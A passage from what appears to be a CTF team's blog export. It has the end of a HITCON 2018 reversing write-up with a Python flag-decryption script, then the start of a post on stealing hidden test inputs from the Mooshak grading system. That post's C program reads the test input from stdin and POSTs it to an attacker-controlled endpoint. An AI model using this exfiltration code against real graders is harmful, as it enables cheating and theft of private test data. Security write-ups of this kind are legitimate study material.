0xEC, 0xA1, 0xC2, 0x2C, 0xB5, 0x2C, 0xBB, 0xF5, 0x9C, 0xF5, 0xB0, 0x6A, 0xDD, 0x6A, 0x41, 0x6B, 0x54, 0x6B, 0xEE, 0x82, 0xD8, 0x82, 0xB6, 0xB7, 0x02, 0xB7, 0xAD, 0xA2, 0x1E, 0xA2, 0xE9, 0xCE, 0x4E, 0xCE, 0x70, 0x0D, 0xFA, 0x0D, 0x51, 0xE1, 0x09, 0xE1, 0x2C, 0xAE, 0x6D, 0xAE, 0xF7, 0xDC, 0x56, 0xDC, 0xD0, 0xED, 0x7A, 0xED, 0x89, 0x49, 0xE9, 0x49, 0x72, 0x46, 0x68, 0x46, 0xD8, 0xA8, 0xE0, 0xA8, 0x26, 0xA0, 0x65, 0xA0, 0x83, 0x47, 0xE1, 0x47, 0xFE, 0x08, 0x85, 0x08, 0xB7, 0x26, 0x4B, 0x26, 0xE8, 0x5F, 0x07, 0x5F, 0x49, 0x2E, 0xCE, 0x2E, 0xF8, 0xD5, 0x5A, 0xD5, 0x0F, 0x09, 0x0C, 0x09, 0xD5, 0xEA, 0x7E, 0xEA, 0x05, 0x07, 0x04, 0x07, 0xFB, 0x0F, 0x81, 0x0F, 0xE5, 0x1D, 0x99, 0x1D, 0x28, 0x38, 0x20, 0x38, 0x2E, 0xE5, 0xFF, 0xE5, 0xDC, 0x3E, 0xAD, 0x3E, 0x44, 0x6C, 0x50, 0x6C, 0x38, 0xB2, 0x7D, 0xB2, 0x6F, 0x8E, 0xAB, 0x8E, 0xF4, 0x06, 0x8D, 0x06, 0x54, 0xE6, 0x0D, 0xE6, 0x5A, 0x7E, 0x48, 0x7E, 0xA7, 0xAC, 0x16, 0xAC, 0x34, 0x61, 0xAA, 0x61, 0x79, 0xD9, 0x29, 0xD9, 0xDB, 0x72, 0x3B, 0x72, 0xF0, 0x90, 0xC0, 0x90, 0x93, 0xCD, 0xBC, 0xCD, 0xC9, 0xB3, 0xF4, 0xB3, 0xCF, 0x6E, 0x2B, 0x6E, 0x6C, 0x54, 0x70, 0x54, 0xAB, 0x7F, 0xC1, 0x7F, 0x85, 0x9A, 0x3E, 0x9A, 0xF2, 0xDB, 0x52, 0xDB, 0x42, 0xB1, 0x8F, 0xB1, 0xAA, 0xEE, 0x88, 0xEE, 0x69, 0x53, 0x74, 0x53, 0xB2, 0x21, 0x4F, 0x21, 0x67, 0xCB, 0x31, 0xCB, 0x74, 0x9B, 0xB7, 0x9B, 0x46, 0x27, 0xC2, 0x27, 0x5D, 0x32, 0xDE, 0x32, 0xD4, 0x7B, 0x37, 0x7B, 0x71, 0x9C, 0xB3, 0x9C, 0x59, 0xA4, 0x93, 0xA4, 0xFD, 0xD2, 0x5E, 0xD2, 0xCE, 0xFF, 0x62, 0xFF, 0xCD, 0x25, 0xB9, 0x25, 0xB5, 0x6D, 0xD9, 0x6D, 0x4A, 0xF4, 0x15, 0xF4, 0xD6, 0x30, 0xA5, 0x30, 0x06, 0xDD, 0xDF, 0xDD, 0x4B, 0x65, 0x5C, 0x65, 0x78, 0x48, 0x60, 0x48, 0x55, 0x77, 0x44, 0x77, 0x27, 0x31, 0x2C, 0x31, 0xE2, 0x51, 0x0F, 0x51, 0x2B, 0xE2, 0xFB, 0xE2, 0x65, 0x80, 0xA3, 0x80, 0xA8, 0xA5, 0x1A, 0xA5, 0x02, 0x4B, 0x92, 0x4B, 0x11, 0x1B, 0x14, 0x1B, 0x9C, 0xC4, 0xB0, 0xC4, 0x2F, 0x74, 0xB6, 0x74, 0xBE, 0xF2, 0x98, 0xF2, 0xEF, 0x13, 0x91, 0x13, 0x3A, 0xF9, 0xEF, 0xF9, 0xD9, 0x39, 0xA9, 0x39, 0x57, 0x3C, 0xD6, 0x3C, 0xEA, 0x14, 0x95, 0x14, 0x24, 0xEB, 0xF7, 0xEB, 0xA2, 0xAB, 0x12, 0xAB, 0x0A, 0x0E, 0x08, 0x0E, 0x5F, 0x79, 0x4C, 0x79, 0xFF, 0x99, 0xCC, 0x99, 0x01, 0x91, 0x49, 0x91, 0xE3, 0xC0, 0x46, 0xC0, 0x25, 0x7A, 0xBE, 0x7A, 0x99, 0xC3, 0xB4, 0xC3, 0x75, 0x0A, 0xFE, 0x0A, 0x8C, 0x4E, 0xED, 0x4E, 0x66, 0x5A, 0x78, 0x5A, 0x7C, 0xDE, 0x2D, 0xDE, 0xC3, 0xBD, 0xFC, 0xBD, 0x1F, 0x83, 0x51, 0x83, 0x98, 0x52, 0xFD, 0x52, 0x33, 0x2D, 0x3C, 0x2D, 0x8B, 0x02, 0x7B, 0x02, 0x22, 0x36, 0x28, 0x36, 0xF1, 0x01, 0x89, 0x01, 0xCB, 0xF8, 0x66, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x37, 0xBB, 0x71, 0xBB, 0x7B, 0x92, 0xBB, 0x92, 0xDE, 0x75, 0x3F, 0x75, 0x3B, 0x68, 0xA6, 0x68, 0x80, 0x9D, 0x3A, 0x9D, 0xCC, 0xB4, 0xF0, 0xB4, 0x4F, 0xF3, 0x11, 0xF3, 0x68, 0xC2, 0x3D, 0xC2, 0x14, 0x1C, 0x10, 0x1C, 0x81, 0x0C, 0x73, 0x0C, 0xB8, 0x2F, 0x47, 0x2F, 0x23, 0xA7, 0x61, 0xA7, 0x96, 0xCA, 0xB8, 0xCA, 0x91, 0x86, 0x2E, 0x86, 0x3F, 0xFE, 0xEB, 0xFE, 0x8F, 0x94, 0x36, 0x94, 0x6E, 0x1F, 0xE2, 0x1F, 0x92, 0x5C, 0xF5, 0x5C, 0x1C, 0x59, 0x8A, 0x59, 0x9A, 0x19, 0x6F, 0x19, 0xED, 0x58, 0x03, 0x58, 0x40, 0xFA, 0x1D, 0xFA, 0x07, 0x4C, 0x96, 0x4C, 0x88, 0xD8, 0xA0, 0xD8, 0x18, 0xCF, 0xC7, 0xCF, 0x8D, 0xDF, 0xA4, 0xDF, 0x29, 0xA9, 0x69, 0xA9, 0x03, 0xDA, 0xDB, 0xDA, 0x36, 0x2A, 0x38, 0x2A, 0xF9, 0x44, 0x13, 0x44, 0x17, 0xC6, 0xCB, 0xC6, 0xA4, 0x76, 0xCD, 0x76, 0x58, 0x35, 0xDA, 0x35, 0xC4, 0xF1, 0x6A, 0xF1, 0x10, 0x8A, 0x5D, 0x8A, 0x04, 0x96, 0x4D, 0x96, 0x13, 0x50, 0x86, 0x50, 0xCA, 0x69, 0x2F, 0x69, 0xA9, 0x34, 0x53, 0x34, 0x1A, 0x84, 0x55, 0x84, 0x1E, 0x12, 0x18, 0x12, 0x15, 0x8D, 0x59, 0x8D, 0xEB, 0x85, 0xDC, 0x85, 0x90, 0x17, 0x67, 0x17, 0x21, 0xEC, 0xF3, 0xEC, 0xE4, 0x8C, 0xD0, 0x8C, 0x5C, 0xA3, 0x97, 0xA3, 0xA3, 0x3A, 0x5B, 0x3A, 0x35, 0xF0, 0xE3, 0xF0, 0xE6, 0xC7, 0x42, 0xC7, 0xC1, 0xF6, 0x6E, 0xF6, 0x6B, 0x18, 0xE6, 0x18, 0x64, 0x11, 0xEA, 0x11, 0x39, 0x23, 0x34, 0x23, 0xA0, 0xE0, 0x80, 0xE0, 0x7E, 0x95, 0xBF, 0x95, 0x9E, 0x8F, 0x22, 0x8F, 0xBA, 0x64, 0xD5, 0x64, 0x53, 0xAA, 0x9B, 0xAA, 0xD2, 0xA6, 0xE8, 0xA6, 0x56, 0xAD, 0x9F, 0xAD, 0xDD, 0xAF, 0xE4, 0xAF, 0xAC, 0x33, 0x57, 0x33, 0x73, 0xD7, 0x21, 0xD7, 0x43, 0x20, 0xC6, 0x20, 0xC1, 0x6E, 0xF6, 0xC1, 0x09, 0xD3, 0xD4, 0x09, 0xB0, 0xDD, 0x6A, 0xB0, 0x18, 0xC7, 0xCF, 0x18, 0xE1, 0xD4, 0x8B, 0xE1, 0xE4, 0xD0, 0x8C, 0xE4, 0x68, 0x3D, 0xC2, 0x68, 0xFD, 0x5E, 0xD2, 0xFD, 0xB1, 0x94, 0xFB, 0xB1, 0x7F, 0xF6, 0x04, 0x7F, 0xF0, 0xC0, 0x90, 0xF0, 0xD9, 0xA9, 0x39, 0xD9, 0x5D, 0xDE, 0x32, 0x5D, 0x2B, 0xFB, 0xE2, 0x2B, 0x17, 0xCB, 0xC6, 0x17, 0x53, 0x9B, 0xAA, 0x53, 0x1F, 0x51, 0x83, 0x1F, 0x00, 0x00, 0x00, 0x00, 0xC9, 0xF4, 0xB3, 0xC9, 0x84, 0x77, 0x0B, 0x84, 0x2D, 0x24, 0x3F, 0x2D, 0x4C, 0xCA, 0x29, 0x4C, 0xC8, 0xBD, 0x22, 0xC8, 0x73, 0x21, 0xD7, 0x73, 0x97, 0xF1, 0x5B, 0x97, 0x94, 0x2A, 0x81, 0x94, 0xD8, 0xE0, 0xA8, 0xD8, 0x4D, 0x83, 0xB8, 0x4D, 0xBB, 0x9C, 0xF5, 0xBB, 0x19, 0x8E, 0x5E, 0x19, 0xF6, 0x1F, 0x4D, 0xF6, 0x20, 0xBA, 0x7D, 0x20, 0x83, 0xE1, 0x47, 0x83, 0x40, 0x1D, 0xFA, 0x40, 0xF5, 0xC4, 0x97, 0xF5, 0xB7, 0x4B, 0x26, 0xB7, 0x62, 0x35, 0xCC, 0x62, 0x8D, 0xA4, 0xDF, 0x8D, 0xD1, 0x33, 0x7C, 0xD1, 0x5B, 0x01, 0xEF, 0x5B, 0x87, 0xAC, 0xD1, 0x87, 0x88, 0xA0, 0xD8, 0x88, 0x6F, 0xAB, 0x8E, 0x6F, 0x23, 0x61, 0xA7, 0x23, 0xAE, 0xC5, 0x78, 0xAE, 0xD2, 0xE8, 0xA6, 0xD2, 0x1C, 0x8A, 0x59, 0x1C, 0xC5, 0x23, 0x60, 0xC5, 0x1E, 0x18, 0x12, 0x1E, 0x72, 0x68, 0x46, 0x72, 0x2C, 0x6D, 0xAE, 0x2C, 0x11, 0x14, 0x1B, 0x11, 0xDC, 0xAD, 0x3E, 0xDC, 0xF8, 0x5A, 0xD5, 0xF8, 0x75, 0xFE, 0x0A, 0x75, 0x51, 0x09, 0xE1, 0x51, 0xD3, 0xA1, 0x37, 0xD3, 0x6A, 0xAF, 0x89, 0x6A, 0x42, 0x8F, 0xB1, 0x42, 0x04, 0x4D, 0x96, 0x04, 0x8C, 0xED, 0x4E, 0x8C, 0xC3, 0xFC, 0xBD, 0xC3, 0xDA, 0x72, 0xE3, 0xDA, 0x3A, 0xEF, 0xF9, 0x3A, 0x37, 0x71, 0xBB, 0x37, 0x8A, 0x32, 0x93, 0x8A, 0xFE, 0x85, 0x08, 0xFE, 0xC2, 0xB5, 0x2C, 0xC2, 0x15, 0x59, 0x8D, 0x15, 0x30, 0xE7, 0xF7, 0x30, 0xCB, 0x66, 0xF8, 0xCB, 0x74, 0xB7, 0x9B, 0x74, 0x9E, 0x22, 0x8F, 0x9E, 0x66, 0x78, 0x5A, 0x66, 0x39, 0x34, 0x23, 0x39, 0x1B, 0x1C, 0x15, 0x1B, 0xEC, 0x4A, 0xC9, 0xEC, 0x29, 0x69, 0xA9, 0x29, 0xF2, 0x52, 0xDB, 0xF2, 0x22, 0x28, 0x36, 0x22, 0x31, 0xAE, 0x66, 0x31, 0xF4, 0x8D, 0x06, 0xF4, 0x85, 0x3E, 0x9A, 0x85, 0x47, 0x8B, 0xB6, 0x47, 0x7E, 0xBF, 0x95, 0x7E, 0x4F, 0x11, 0xF3, 0x4F, 0xED, 0x03, 0x58, 0xED, 0xE5, 0x99, 0x1D, 0xE5, 0x45, 0x19, 0xFD, 0x45, 0x92, 0xF5, 0x5C, 0x92, 0xE6, 0x42, 0xC7, 0xE6, 0x34, 0xAA, 0x61, 0x34, 0x14, 0x10, 0x1C, 0x14, 0x35, 0xE3, 0xF0, 0x35, 0xAF, 0x8C, 0xE9, 0xAF, 0x08, 0x9A, 0x45, 0x08, 0x27, 0x2C, 0x31, 0x27, 0x05, 0x04, 0x07, 0x05, 0x2E, 0xFF, 0xE5, 0x2E, 0xEF, 0x91, 0x13, 0xEF, 0x77, 0x6C, 0x41, 0x77, 0xA8, 0x1A, 0xA5, 0xA8, 0xD4, 0x37, 0x7B, 0xD4, 0x0D, 0x9E, 0x42, 0x0D, 0xAC, 0x57, 0x33, 0xAC, 0xDB, 0x3B, 0x72, 0xDB, 0xBD, 0x43, 0x28, 0xBD, 0x80, 0x3A, 0x9D, 0x80, 0x65, 0xA3, 0x80, 0x65, 0x0E, 0x45, 0x98, 0x0E, 0x81, 0x73, 0x0C, 0x81, 0xB8, 0x47, 0x2F, 0xB8, 0x7C, 0x2D, 0xDE, 0x7C, 0xDD, 0xE4, 0xAF, 0xDD, 0x79, 0x29, 0xD9, 0x79, 0xFC, 0x17, 0x43, 0xFC, 0x86, 0xE5, 0x40, 0x86, 0x64, 0xEA, 0x11, 0x64, 0x8B, 0x7B, 0x02, 0x8B, 0x8F, 0x36, 0x94, 0x8F, 0xE2, 0x0F, 0x51, 0xE2, 0x6B, 0xE6, 0x18, 0x6B, 0x2A, 0xB2, 0x73, 0x2A, 0x12, 0xCF, 0xC1, 0x12, 0xA0, 0x80, 0xE0, 0xA0, 0xDF, 0x76, 0xE4, 0xDF, 0x5F, 0x4C, 0x79, 0x5F, 0x99, 0xB4, 0xC3, 0x99, 0xA5, 0x84, 0xE7, 0xA5, 0x49, 0xCE, 0x2E, 0x49, 0xF9, 0x13, 0x44, 0xF9, 0xD7, 0xEC, 0xA1, 0xD7, 0xE7, 0x0B, 0x56, 0xE7, 0xA4, 0xCD, 0x76, 0xA4, 0x63, 0x7C, 0x5D, 0x63, 0x25, 0xBE, 0x7A, 0x25, 0xF3, 0x1B, 0x4A, 0xF3, 0x67, 0x31, 0xCB, 0x67, 0xEE, 0xD8, 0x82, 0xEE, 0xA6, 0x5F, 0x3D, 0xA6, 0xC7, 0xB1, 0x2B, 0xC7, 0xC0, 0x27, 0x67, 0xC0, 0x07, 0x96, 0x4C, 0x07, 0x6E, 0xE2, 0x1F, 0x6E, 0xAA, 0x88, 0xEE, 0xAA, 0xCD, 0xB9, 0x25, 0xCD, 0x61, 0xEE, 0x16, 0x61, 0x0C, 0xD7, 0xD3, 0x0C, 0xB5, 0xD9, 0x6D, 0xB5, 0x54, 0x0D, 0xE6, 0x54, 0x1D, 0xC3, 0xC8, 0x1D, 0x93, 0xBC, 0xCD, 0x93, 0x43, 0xC6, 0x20, 0x43, 0xCE, 0x62, 0xFF, 0xCE, 0x71, 0xB3, 0x9C, 0x71, 0x57, 0xD6, 0x3C, 0x57, 0x4B, 0x5C, 0x65, 0x4B, 0xB6, 0x02, 0xB7, 0xB6, 0x95, 0x63, 0x10, 0x95, 0x60, 0xA7, 0x87, 0x60, 0x58, 0xDA, 0x35, 0x58, 0x82, 0xA8, 0xD6, 0x82, 0xEA, 0x95, 0x14, 0xEA, 0x1A, 0x55, 0x84, 0x1A, 0xFB, 0x81, 0x0F, 0xFB, 0x56, 0x9F, 0xAD, 0x56, 0xE0, 0x9D, 0x1A, 0xE0, 0x3E, 0xA2, 0x6F, 0x3E, 0x06, 0xDF, 0xDD, 0x06, 0x89, 0xE9, 0x49, 0x89, 0x24, 0xF7, 0xEB, 0x24, 0x7A, 0xF2, 0x03, 0x7A, 0x41, 0x54, 0x6B, 0x41, 0xE3, 0x46, 0xC0, 0xE3, 0x91, 0x2E, 0x86, 0x91, 0x28, 0x20, 0x38, 0x28, 0x9D, 0xF9, 0x55, 0x9D, 0xD5, 0x7E, 0xEA, 0xD5, 0x46, 0xC2, 0x27, 0x46, 0x6C, 0x70, 0x54, 0x6C, 0x21, 0xF3, 0xEC, 0x21, 0x50, 0x40, 0x70, 0x50, 0x5A, 0x48, 0x7E, 0x5A, 0xDE, 0x3F, 0x75, 0xDE, 0x26, 0x65, 0xA0, 0x26, 0x48, 0x87, 0xBF, 0x48, 0xB2, 0x4F, 0x21, 0xB2, 0xD0, 0x7A, 0xED, 0xD0, 0x36, 0x38, 0x2A, 0x36, 0xAB, 0xC1, 0x7F, 0xAB, 0xBF, 0xD1, 0x63, 0xBF, 0xA9, 0x53, 0x34, 0xA9, 0x5E, 0x05, 0xE8, 0x5E, 0x32, 0x75, 0xBC, 0x32, 0x01, 0x49, 0x91, 0x01, 0x3F, 0xEB, 0xFE, 0x3F, 0x55, 0x44, 0x77, 0x55, 0x38, 0x7D, 0xB2, 0x38, 0xC6, 0xF8, 0xBA, 0xC6, 0xFF, 0xCC, 0x99, 0xFF, 0xAD, 0x1E, 0xA2, 0xAD, 0x5C, 0x97, 0xA3, 0x5C, 0x02, 0x92, 0x4B, 0x02, 0x76, 0x25, 0xD0, 0x76, 0xA2, 0x12, 0xAB, 0xA2, 0xE8, 0x07, 0x5F, 0xE8, 0x3B, 0xA6, 0x68, 0x3B, 0xB4, 0x90, 0xFC, 0xB4, 0xF1, 0x89, 0x01, 0xF1, 0x0A, 0x08, 0x0E, 0x0A, 0xCF, 0x2B, 0x6E, 0xCF, 0x70, 0xFA, 0x0D, 0x70, 0xD6, 0xA5, 0x30, 0xD6, 0x7D, 0x64, 0x4F, 0x7D, 0x0B, 0x41, 0x9F, 0x0B, 0x59, 0x93, 0xA4, 0x59, 0xEB, 0xDC, 0x85, 0xEB, 0x03, 0xDB, 0xDA, 0x03, 0x3D, 0x79, 0xB5, 0x3D, 0x44, 0x50, 0x6C, 0x44, 0x4A, 0x15, 0xF4, 0x4A, 0xF7, 0x56, 0xDC, 0xF7, 0x6D, 0x39, 0xC5, 0x6D, 0x7B, 0xBB, 0x92, 0x7B, 0x52, 0xD2, 0x3B, 0x52, 0x9F, 0x6B, 0x1E, 0x9F, 0x8E, 0x7F, 0x05, 0x8E, 0x98, 0xFD, 0x52, 0x98, 0x69, 0x74, 0x53, 0x69, 0xBC, 0x0A, 0xB9, 0xBC, 0x33, 0x3C, 0x2D, 0x33, 0xBA, 0xD5, 0x64, 0xBA, 0x78, 0x60, 0x48, 0x78, 0xB9, 0x0E, 0xBE, 0xB9, 0xA3, 0x5B, 0x3A, 0xA3, 0x3C, 0x30, 0x24, 0x3C, 0x0F, 0x0C, 0x09, 0x0F, 0x96, 0xB8, 0xCA, 0x96, 0xA1, 0xC9, 0x71, 0xA1, 0xBE, 0x98, 0xF2, 0xBE, 0xCA, 0x2F, 0x69, 0xCA, 0x2F, 0xB6, 0x74, 0x2F, 0x90, 0x67, 0x17, 0x90, 0xC4, 0x6A, 0xF1, 0xC4, 0xCC, 0xF0, 0xB4, 0xCC, 0xFA, 0xC8, 0x9E, 0xFA, 0x10, 0x5D, 0x8A, 0x10, 0x9C, 0xB0, 0xC4, 0x9C, 0xE9, 0x4E, 0xCE, 0xE9, 0x9B, 0x26, 0x88, 0x9B, 0x9A, 0x6F, 0x19, 0x9A, 0x13, 0x86, 0x50, 0x13, 0x4E, 0x58, 0x62, 0x4E, 0xA7, 0x16, 0xAC, 0xA7, 0x16, 0x82, 0x57, 0x16, 0xB3, 0x06, 0xB0, 0xB3]# Rotate left: 0b1001 --&gt; 0b0011rol = lambda val, r_bits, max_bits: \\ (val &lt;&lt; r_bits % max_bits) &amp; (2**max_bits - 1) | \\ ((val &amp; (2**max_bits - 1)) &gt;&gt; (max_bits - (r_bits % max_bits)))# Rotate right: 0b1001 --&gt; 0b1100ror = lambda val, r_bits, max_bits: \\ ((val &amp; (2**max_bits - 1)) &gt;&gt; r_bits % max_bits) | \\ (val &lt;&lt; (max_bits - (r_bits % max_bits)) &amp; (2**max_bits - 1))def access_offstream(offset, index): return array_of_ints_to_int(offset[index:index + 4][::-1])def array_of_ints_to_int(a): return int(''.join(pack('!B', x) for x in a).encode('hex'), 16)def shr_add_xor(dword, offset, shifts, adds=[0, 0, 0, 0], muls=[1, 1, 1, 1]): edx = ((dword &gt;&gt; shifts[0] &amp; 0xff) + adds[0]) * muls[0] a = array_of_ints_to_int(offset[edx:edx + 4][::-1]) edx = ((dword &gt;&gt; shifts[1] &amp; 0xff) + adds[1]) * muls[1] b = array_of_ints_to_int(offset[edx:edx + 4][::-1]) c = a ^ b edx = ((dword &gt;&gt; shifts[2] &amp; 0xff) + adds[2]) * muls[2] d = array_of_ints_to_int(offset[edx:edx + 4][::-1]) e = d ^ c edx = ((dword &gt;&gt; shifts[3] &amp; 0xff) + adds[3]) * muls[3] f = array_of_ints_to_int(offset[edx:edx + 4][::-1]) g = f ^ e return a, b, c, d, f, gdef sum_sum_xor(dword0, dword1, dword3, offset, offset_index): sum1 = (dword0 + dword1) &amp; 0xffffffff sum2 = ( sum1 + array_of_ints_to_int(offset[offset_index:offset_index + 4][::-1])) &amp; 0xffffffff return sum2 ^ dword3encrypted_flag = [0x4F, 0x6F, 0xA7, 0x87, 0xE9, 0x51, 0x87, 0x64, 0x38, 0x2A, 0x46, 0xE5, 0x4F, 0x21, 0x9E, 0x1C, 0xCD, 0x65, 0xE1, 0x9A, 0x4F, 0xCF, 0xDE, 0x52, 0x09, 0xBF, 0x53, 0xC4, 0xB0, 0x95, 0x75, 0x31, 0xAC, 0x2F, 0xF4, 0x97, 0x1D, 0xA5, 0x9A, 0x02, 0xA8, 0xFF, 0xAE, 0x2E, 0xB9, 0x70, 0xCC, 0x02]xor_keys_input0 = [0] * 0x8xor_keys_input1 = [0] * 0x8for x in range(len(encrypted_flag)): if (x % 16) &lt; 8: xor_keys_input0.append(encrypted_flag[x]) else: xor_keys_input1.append(encrypted_flag[x])flag = ''for x in range(0, 16 * 3, 16): test = encrypted_flag[x:16 + x] dword_560CC63C71B0 = test[:8][::-1] dword_560CC63C71B8 = test[8:][::-1] dword_560CC63C71C0 = array_of_ints_to_int(dword_560CC63C71B8[-4:]) dword_560CC63C71C4 = array_of_ints_to_int(dword_560CC63C71B8[:4]) dword_560CC63C71C8 = array_of_ints_to_int(dword_560CC63C71B0[-4:]) dword_560CC63C71CC = array_of_ints_to_int(dword_560CC63C71B0[:4]) dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream( off_560CC63C7150, 0x10) dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream( off_560CC63C7150, 0x14) dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream( off_560CC63C7150, 0x18) dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream( off_560CC63C7150, 0x1c) for i in range(16 * 7, -16, -16): dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C8, off_560CC63C7150, [ 0, 8, 0x10, 0x18], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71CC, off_560CC63C7150, [ 0x18, 0, 0x8, 0x10], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] edx = dword_560CC63C71D0 + \\ (dword_560CC63C71D4 + dword_560CC63C71D4) &amp; 0xffffffff eax = (array_of_ints_to_int(off_560CC63C7150[ 0x2c + i:0x2c + 4 + i][::-1]) + edx) &amp; 0xffffffff dword_560CC63C71C4 = dword_560CC63C71C4 ^ eax dword_560CC63C71C4 = ror(dword_560CC63C71C4, 1, max_bits) dword_560CC63C71C0 = rol(dword_560CC63C71C0, 1, max_bits) dword_560CC63C71C0 = sum_sum_xor( dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C0, off_560CC63C7150, 0x28 + i) dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C0, off_560CC63C7150, [ 0, 8, 0x10, 0x18], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71C4, off_560CC63C7150, [ 0x18, 0, 0x8, 0x10], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] edx = dword_560CC63C71D0 + \\ ((dword_560CC63C71D4 + dword_560CC63C71D4) &amp; 0xffffffff) eax = (array_of_ints_to_int(off_560CC63C7150[ 0x24 + i:0x24 + 4 + i][::-1]) + edx) &amp; 0xffffffff dword_560CC63C71CC = dword_560CC63C71CC ^ eax dword_560CC63C71CC = ror(dword_560CC63C71CC, 1, max_bits) dword_560CC63C71C8 = rol(dword_560CC63C71C8, 1, max_bits) dword_560CC63C71C8 = sum_sum_xor( dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C8, off_560CC63C7150, 0x20 + i) dwords_flaginput = [dword_560CC63C71C8, dword_560CC63C71CC] dwords_flaginput2 = [dword_560CC63C71C0, dword_560CC63C71C4] k = 0 s = '' for i in range(0, 8, 4): s += pack(\"&lt;I\", dwords_flaginput2[k] ^ access_offstream(off_560CC63C7150, i)) k += 1 s = pack(\"&gt;Q\", int(s.encode('hex'), 16) ^ array_of_ints_to_int(xor_keys_input0[x / 2:x / 2 + 8])) s1 = '' k = 0 for i in range(8, 8 * 2, 4): s1 += pack(\"&lt;I\", dwords_flaginput[k] ^ access_offstream(off_560CC63C7150, i)) k += 1 s1 = pack(\"&gt;Q\", int(s1.encode('hex'), 16) ^ array_of_ints_to_int(xor_keys_input1[x / 2:x / 2 + 8])) flag += s + s1print \"hitcon&#123;\"+flag+\"&#125;\" Running it to get the flag : 12$ python reverselukaku.py hitcon&#123;~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\\o^_^o/&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"},{"name":"exceptions","slug":"exceptions","permalink":"https://teamrocketist.github.io/tags/exceptions/"},{"name":"hitcon2018","slug":"hitcon2018","permalink":"https://teamrocketist.github.io/tags/hitcon2018/"}]},{"title":"[Web] Mooshak - Stealing private tests from mooshak","slug":"Web-Mooshak-Stealing-private-tests-from-mooshak","date":"2018-10-14T20:01:50.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/","link":"","permalink":"https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/","excerpt":"","text":"A long time ago in a secret meme group far far away I did find this: This meme made me giggle straight way, not because of the meme itself but the message “If we only could do this”, back in the day I already how to do it but never tested it out in a live server for obvious reasons and lets make it clear IST projects nowadays are so easy we don’t really need have to cheat. Finally decided to do a write up about this, I downloaded mooshak and installed on a VM machine and created a c contest. I don’t really consider this an attack or a hack, if we were talking about games we could easily say this was “clever use of game mechanics”, as you know most of the project contests in IST have this basic idea to run tests: 12Input -&gt; Receives the input of a specific test into your program.Output -&gt; Compares the output of your project and server output (this is what determines whether you passed or not a test). As we know we are going to read the input into memory, since we can control the code and what is running, we just need to find a way to sent the information out to ourselves, one way to do this is by using GET or POST requests: The GET request has a limit of 8192 bytes so in a bigger input test you won’t be able to send the entire test so I recommend to use a POST , writing the code necessary in c to do this is quite challenging but in another languages like python, lisp or even prolog is quite simple, speaking about the endpoint that are going to receive our requests you either write in php or any other language. The test.c file: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255#define _DEFAULT_SOURCE#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;netdb.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt; #include &lt;ctype.h&gt;int create_tcp_socket();char *get_ip(char *host);char *build_get_query(char *host, char *page);void usage();char *join_strings();int http_request(int argc, char **argv, char* path, char* method);char *build_post_query(char *host, char *page, char* post_data); #define HOST \"127.0.0.1\"#define PAGE \"/wtf.php\"#define PORT 80#define USERAGENT \"HTMLGET 1.0\"char *url_encode(char *str);/* GET request limit is 8192 bytes we could try a post request but would be to heavy to ther server with 1 million nodes*/int main(int argc, char **argv) &#123; char *str; char c; int i = 0; int size = 16; http_request(3, argv, url_encode(\"---------------\"), \"post\"); str = (char*) malloc(sizeof(char)*size + 1); while ((c = getchar()) != EOF) &#123; str[i++]=c; if (i == size) &#123; str = realloc(str, sizeof(char)*(size+=16)); &#125; &#125; str[i++]='\\0'; http_request(3, argv, url_encode(str), \"post\"); free(str); return 0;&#125;/* Converts a hex character to its integer value */char from_hex(char ch) &#123; return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;&#125;/* Converts an integer value to its hex character*/char to_hex(char code) &#123; static char hex[] = \"0123456789abcdef\"; return hex[code &amp; 15];&#125;/* Returns a url-encoded version of str *//* IMPORTANT: be sure to free() the returned string after use */char *url_encode(char *str) &#123; char *pstr = str, *buf = malloc(strlen(str) * 3 + 1), *pbuf = buf; while (*pstr) &#123; if (isalnum(*pstr) || *pstr == '-' || *pstr == '_' || *pstr == '.' || *pstr == '~') *pbuf++ = *pstr; else if (*pstr == ' ') *pbuf++ = '+'; else *pbuf++ = '%', *pbuf++ = to_hex(*pstr &gt;&gt; 4), *pbuf++ = to_hex(*pstr &amp; 15); pstr++; &#125; *pbuf = '\\0'; return buf;&#125;/* Returns a url-decoded version of str *//* IMPORTANT: be sure to free() the returned string after use */char *url_decode(char *str) &#123; char *pstr = str, *buf = malloc(strlen(str) + 1), *pbuf = buf; while (*pstr) &#123; if (*pstr == '%') &#123; if (pstr[1] &amp;&amp; pstr[2]) &#123; *pbuf++ = 